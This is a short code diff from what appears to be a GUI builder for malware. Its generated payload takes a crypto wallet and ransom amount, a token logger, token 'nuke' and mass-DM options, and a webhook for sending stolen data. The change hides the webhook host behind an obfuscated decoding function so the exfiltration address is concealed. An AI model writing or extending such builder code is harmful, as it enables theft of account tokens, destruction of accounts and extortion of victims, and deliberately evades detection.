@@ -365,7 +365,7 @@ class App(customtkinter.CTk):
             "CRYPTO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
             "CURRENCY": currency,
-            "WEBHOOK": f'"https://{webhook}/webhook"' if dynamic_webhook else f'"{webhook}"',
+            "WEBHOOK": f'"https://"+O0O000OOO00O0OOO0("{server_addr}").decode()+"/webhook"' if dynamic_webhook else f'"{webhook}"',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM_BOOL": massdm,
